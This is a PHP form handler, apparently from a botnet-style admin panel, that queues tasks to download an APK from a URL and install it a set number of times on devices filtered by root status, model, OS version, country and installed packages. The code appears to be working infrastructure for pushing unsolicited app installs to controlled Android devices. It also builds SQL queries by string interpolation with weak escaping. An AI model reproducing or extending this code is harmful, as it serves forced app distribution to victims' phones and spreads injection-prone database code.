<?php
if(!isset($_POST['number']))
	die;
	
include '../../db.php';
include '../check_sess_1.php';
include '../lib.php';

$error = '';
$result = 1;

function parse_data()
{
	global $error;
	$data = array();
	
	if(!trim($_POST['number']) or (int) $_POST['number'] == 0)
	{
		$error = "ID is incorrect";
		return false;
	}

	$data['number'] = (int) $_POST['number'];

	//~ $pack = mysql_escape_string($_POST['pack']);		# parse automatically
	//~ if(!trim($pack) or !preg_match('#[a-z0-9\.]+#', $pack))
	//~ {
		//~ $error = "package name is incorrect";
		//~ return false;
	//~ }
	//~ $data['pack'] = $pack;
	
	
	$data['url'] = mysql_escape_string(trim($_POST['url']));
	if(!$data['url'])
	{
		$error = "apk URL is not valid";
		return false;
	}
	
	$apk_info = download_apk($data['url']);
	if($apk_info === false)
	{
		$error = "Can't download apk by URL";
		return false;
	}
	
	$data['size'] = $apk_info['size'];
	$data['pack'] = $apk_info['pack'];
	if($data['pack'] === false)
	{
		$error = "Can't parse package name from apk";
		return false;
	}
	
	$data['times'] = (int)$_POST['times'];
	if($data['times'] < 1)
	{
		$error = "Install times count can not be less than 1";
		return false;
	}
	
	$data['root'] = $_POST['root'];
	if(!in_array($data['root'], array(1, 2, '')))
	{
		$error = "Wrong root value";
		return false;
	}
	
	$data['model'] = trim(mysql_escape_string($_POST['model']));
	$data['osver'] = trim(mysql_escape_string($_POST['osver']));
	$data['country'] = trim(mysql_escape_string($_POST['country']));
		$data['country'] = str_replace(' ', '', $data['country']);
		
	$data['lim'] = (trim($_POST['lim']))? (int) $_POST['lim'] : '';
	$data['land'] = trim(mysql_escape_string($_POST['landing']));
	if($data['land'] && !check_landing($data['land']))
	{
		$error = "Landing URL is inaccessible; Server should response with 200 OK & text/html";
		return false;
	}
	
	$data['packy'] = trim(mysql_escape_string($_POST['packy']));
		$data['packy'] = str_replace(' ', '', $data['packy']);
	$data['packn'] = trim(mysql_escape_string($_POST['packn']));
		$data['packn'] = str_replace(' ', '', $data['packn']);
	
	$data['device_clear'] = ($_POST['clear_devices'] == 'false')? 0 : 1;
	
	//~ file_put_contents('/var/www/tmp/X', print_r($data,true));
	
	return $data; // is ok
}

$data = parse_data();
if($data === false)
	$result = 0;
	
if($result)
{
	$sql = <<<PHP
INSERT INTO `task` SET `number` = '{$data["number"]}', 
	`package` = '{$data["pack"]}', 
	`url` = '{$data["url"]}', 
	`size` = '{$data["size"]}', 
	`times` = '{$data["times"]}',
	`root` = '{$data["root"]}',
	`model` = '{$data["model"]}',
	`osver` = '{$data["osver"]}',
	`country` = '{$data["country"]}',
	`lim` = '{$data["lim"]}',
	`landing` = '{$data["land"]}',
	`packy` = '{$data["packy"]}',
	`packn` = '{$data["packn"]}',
	`device_clear` = '{$data["device_clear"]}',
	`active` = '2'
PHP;

	$result1 = $mysqli->query($sql);
}

echo '{"result":"'.$result.'", "error": "'.$error.'"}';
